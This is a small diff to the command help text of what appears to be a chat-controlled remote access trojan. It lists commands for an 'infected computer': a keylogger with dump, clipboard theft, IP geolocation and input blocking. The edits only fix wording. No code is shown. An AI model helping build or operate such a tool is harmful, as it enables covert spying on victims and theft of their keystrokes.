@@ -37,13 +37,13 @@ Availaible commands are :
 --> !write = Type your desired sentence on infected computer
 --> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
 --> !clipboard = Retrieve infected computer clipboard content
---> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
+--> !geolocate = Geolocate computer using latitude and longitude of the ip address with google map / Warning : Geolocating IP addresses is not very precise
 --> !startkeylogger = Starts a keylogger / Warning : Likely to trigger AV 
 --> !stopkeylogger = Stops keylogger
 --> !dumpkeylogger = Dumps the keylog
 --> !volumemax = Put volume at 100%
 --> !volumezero = Put volume at 0%
---> !idletime = Get the idle time of user's on target computer
+--> !idletime = Get the idle time of user
 --> !sing = Play chosen video in background (Only works with youtube links)
 --> !stopsing = Stop video playing in background
 --> !blockinput = Blocks user's keyboard and mouse / Warning : Admin rights are required
